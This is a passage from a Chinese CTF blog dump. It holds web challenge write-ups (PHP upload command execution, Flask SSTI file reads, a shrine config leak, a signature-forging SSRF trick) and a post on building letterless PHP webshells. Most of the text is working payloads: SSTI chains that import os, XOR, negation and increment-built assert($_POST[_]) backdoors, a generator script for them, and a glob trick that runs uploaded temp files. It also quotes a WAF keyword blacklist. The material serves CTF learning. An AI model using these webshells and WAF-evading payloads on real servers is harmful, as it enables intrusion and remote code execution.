md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; 我们要上传两个参数，action表示模式，data表示写入index.php中的内容。发现waf把php过滤了，因此要用到短标签，而空格被过滤，在php中可以用%09替代，payload： 1?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt; 写入后访问pwd给出的路径，即可发现命令被执行，因此我们读取flag文件： 1?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt; [GYCTF2020]FlaskApp有一个base64加密与base64解密网页，将&#123;&#123;2+2&#125;&#125;进行base64加密后进行解密，发现结果为4，说明存在ssti。但是构建payload的时候发现有东西被过滤了，这里要bypass。 根据提示发现debug页面，发现源码为app.py，因此是python flask。 我们先读取源码： 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 发现waf： 1def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;失败乃成功之母！！&amp;#34 html解码： 1&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot; 因此这里需要进行字符串拼接，遍历目录payload： 12345payload1:&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;payload2:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 读取flag： 12345payload1:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;payload2:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; [WesternCTF2018]shrine看到题目就想到应该是shrine模板注入，进行测试： 1/shrine/&#123;&#123;2+2&#125;&#125; 回显是4，说明存在ssti。推测&#123;undefined&#123;config&#125;&#125;可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号。不过python还有一些内置函数，比如url_for和get_flashed_messages。 payload： 12345/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; 均可得到flag。 [De1CTF 2019]SSRF Me进入网页看着一串代码头都大了，自己重新编辑下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#! /usr/bin/env python# #encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=9999) 看起来挺复杂的，但核心其实就两个路由：/geneSign和/De1ta。我们发现/geneSign路由是将param和action拼接而成的，接着返回到getSign()中，进行md5加密。 接着是/De1ta路由，在这个路由中获取三个变量，GET获取param，Cookie获取action和sign，在检查的时候要满足getSign(self.action, self.param) == self.sign。 因此我们这样构建payload，首先： 123/geneSign?param=flag.txtread//175fadbcd603662b8637028cae3aaf1e 这样相当于我们获得了一个flag.txtreadscan的sign值，接着： 12/De1ta?param=flag.txtCookie: action=readscan;sign=175fadbcd603662b8637028cae3aaf1e 这相当于我们的getSign(self.action, self.param)为flag.txt+readscan，和sign对应上了，而这样又能将param中文件内容读出并返回给我们，以此获取flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"特殊webshell的构建","slug":"特殊webshell的构建","date":"2022-03-05T06:44:09.000Z","updated":"2022-03-06T09:15:25.655Z","comments":true,"path":"2022/03/05/特殊webshell的构建/","link":"","permalink":"http://example.com/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/","excerpt":"前言 这个坑就直接填了吧，毕竟这东西还是很有意思的，而且对很多waf都可以起到很好的效果。","text":"前言 这个坑就直接填了吧，毕竟这东西还是很有意思的，而且对很多waf都可以起到很好的效果。 无字符webshell众所周知，我们经常写入的webshell不外乎就是那些常见的一句码，最多过滤一些关键字或者关键符号。但是有些题目，却不允许我们上传的webshell中存在数字与字母，这时候就需要编造特殊的webshell来绕过了。 编写这类无字符webshell的核心就是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，然后动态执行之即可。 方法一利用php两个字符串异或后得到的仍是一个字符串的操作，通过异或来代替字母与数字，达到绕过的目的： 12345&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]); 当然我们可以通过这个脚本获取异或值： 1234&lt;?phpfor($i=128;$i&lt;255;$i++)&#123; echo sprintf(&quot;%s^%s&quot;,urlencode(chr($i)),urlencode(chr(255))).&quot;=&gt;&quot;. (chr($i)^chr(255)).&quot;\\n&quot;;&#125;?&gt; 方法二除了异或，在php中，取反也是可以得到字符串的，例如&#39;和&#39;&#123;2&#125;的结果为&quot;\\x8c&quot;，其取反就为s。 这种是利用中文utf-8编码的性质来取反的，和的utf-8编码的第三部分的取反结果为s，然后利用这个性质，采用.=的方式逐个叠加成马。而用到的0~2数字我们可以通过字符比较大小方式确定一个0或者1，然后再通过++或者–的方式取到一个任意大小的数字。 放一个payload： 12345678910111213&lt;?php$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);//assert($_POST[_]); 或者我们直接用汉字取反，然后通过.=的方式构建payload： 123456789101112131415161718192021222324&lt;?php$_++; //得到1，此时$_=1$__ = &quot;极&quot;;$___ = ~($__&#123;$_&#125;); //得到a，此时$___=&quot;a&quot;$__ = &quot;区&quot;;$___ .= ~($__&#123;$_&#125;); //得到s，此时$___=&quot;as&quot;$___ .= ~($__&#123;$_&#125;); //此时$___=&quot;ass&quot;$__ = &quot;皮&quot;;$___ .= ~($__&#123;$_&#125;); //得到e，此时$___=&quot;asse&quot;$__ = &quot;十&quot;;$___ .= ~($__&#123;$_&#125;); //得到r，此时$___=&quot;asser&quot;$__ = &quot;勺&quot;;$___ .= ~($__&#123;$_&#125;); //得到t，此时$___=&quot;assert&quot;$____ = &#x27;_&#x27;; //$____=&#x27;_&#x27;$__ = &quot;寸&quot;;$____ .= ~($__&#123;$_&#125;); //得到P，此时$____=&quot;_P&quot;$__ = &quot;小&quot;;$____ .= ~($__&#123;$_&#125;); //得到O，此时$____=&quot;_PO&quot;$__ = &quot;欠&quot;;$____ .= ~($__&#123;$_&#125;); //得到S，此时$____=&quot;_POS&quot;$__ = &quot;立&quot;;$____ .= ~($__&#123;$_&#125;); //得到T，此时$____=&quot;_POST&quot;$_ = $$____; //$_ = $_POST$___($_[_]); //assert($_POST[_])&gt; 可以用下面这个exp获取取反的字符： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$shell = &quot;system&quot;;$result = &quot;&quot;;$arr =array();$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;function mb_str_split( $string ) &#123; return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string );&#125;foreach (mb_str_split($word) as $c)&#123; $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123; for ($y=0;$y&lt;count($arr);$y++) &#123; $k = $arr[$y]; if ($shell[$x] == ~($k&#123;1&#125;)) &#123; $result .= $k; break; &#125; &#125;&#125;echo $result;?&gt; 方法三这个方法运用到了php递增的递增运算，而php的自增运算和c是不一样的：递增／递减运算符 比如： 1234567$a=&#x27;a&#x27;;&amp;z=&#x27;z&#x27;;echo ++$a;echo ++$z;//b//aa 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。那么怎么获取到字符a呢？我们发现数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 123echo &#x27;&#x27;.[]//Array 而由于php大小写不敏感，因此取第一个大写A就可以了，payload： 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); ps.assert不适用于高版本php，高版本php可以使用file_put_contents等其他函数替代 方法四如果$或者长度遭到限制，上面的方法就失效了，不过在php7中支持使用($a)();这种方法来调用命令，因此我们可以直接使用取反来构建payload： 12(~%8F%97%8F%96%91%99%90)();//phpinfo(); 方法五但是在php7以前都不支持这种表达，这时我们要应用linux shell下的两个知识点： shell下可以使用.来执行任意脚本文件 linux文件名支持glob通配符替代 比如我们将echo &quot;ls&quot;写入mrl64中，然后执行.mrl64，我们发现ls被执行成功了。 而通配符都有哪些呢： 1234567*可以代替0个及以上任意文件?可以代表1个任意字符[^a]可以用来判断这个位置的字符是不是a[0-9]可以用来限制范围 我们发送一个上传文件的POST包时，文件会被保存在这个/tmp/phpXXXXXX临时文件夹下，XXXXXX是六位随机大小写字母，由于干扰我们的文件全部都是小写的，因此我们可以通过限制大写来执行文件。由于大写字母的前后是@与[，因此payload： 1`.+/???/????????[@-[]` 因此这样就可以执行我们上传文件的内容，我们可以直接命令执行，也可以写入一句马等等。 方法六这个方法使用在python上的，因为没有学习过pythonjail相关的知识，因此就不做详细分析了，把文章放出来作为参考：一道有趣的pyjail题目分析 关于无字符webshell，可以仔细研究下p牛的两篇文章：一些不包含数字和字母的webshell无字母数字webshell之提高篇 无参数rce无字符webshell过滤的是字母及数字，或许还有些特殊符号，而无参数rce中过滤的往往都是符号，因此这类payload的构造往往和函数的应用有关。 